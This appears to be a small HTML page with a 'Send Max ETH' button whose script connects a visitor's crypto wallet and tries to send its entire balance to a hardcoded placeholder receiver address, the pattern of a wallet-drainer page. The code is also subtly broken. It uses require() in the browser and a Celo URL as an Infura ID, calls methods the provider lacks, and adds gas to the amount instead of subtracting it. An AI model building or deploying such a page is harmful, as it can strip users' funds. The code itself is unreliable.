<!DOCTYPE html>
<html>

<head>
</head>

<body>
    <button id="send-max-eth-button" onClick="sendMaxETH()">Send Max ETH</button>
    <script src="https://unpkg.com/web3modal"></script>
    <script src="https://unpkg.com/@walletconnect/web3-provider"></script>
    <script>
        const Web3Modal = require('web3modal');
        const WalletConnectProvider = require('@walletconnect/web3-provider').default;

        // Initialize Web3Modal with WalletConnect as the provider
        const web3Modal = new Web3Modal({
            network: 'mainnet', // or 'ropsten', 'rinkeby', etc.
            provider: new WalletConnectProvider({
                infuraId: 'https://celo-mainnet.infura.io/v3/9fd0522c64d642d1a69265f91c5fbe74'
            })
        });

        async function sendMaxETH() {
            // Connect to the wallet
            const provider = await web3Modal.connect();

            // Get the user's ETH balance
            const balance = await provider.eth.getBalance(provider.address);

            // Convert balance to ETH
            const etherBalance = provider.utils.fromWei(balance, 'ether');

            // Set the amount to the max balance in ETH
            const amount = etherBalance;

            // Get the current gas price
            const gasPrice = await provider.eth.getGasPrice();

            // Set the gas limit
            const gasLimit = 21000;

            // Calculate the total gas cost
            const gasCost = provider.utils.toWei(gasPrice.mul(gasLimit), 'gwei');

            // Calculate the total cost (amount + gas cost)
            const totalCost = amount.add(gasCost);

            // Create a transaction object
            const tx = {
                to: 'RECEIVER_ADDRESS',
                value: totalCost,
                gas: gasLimit
            };

            // Sign and send the transaction
            const receipt = await provider.eth.sendTransaction(tx);

            console.log(receipt);
        }
    </script>
</body>

</html>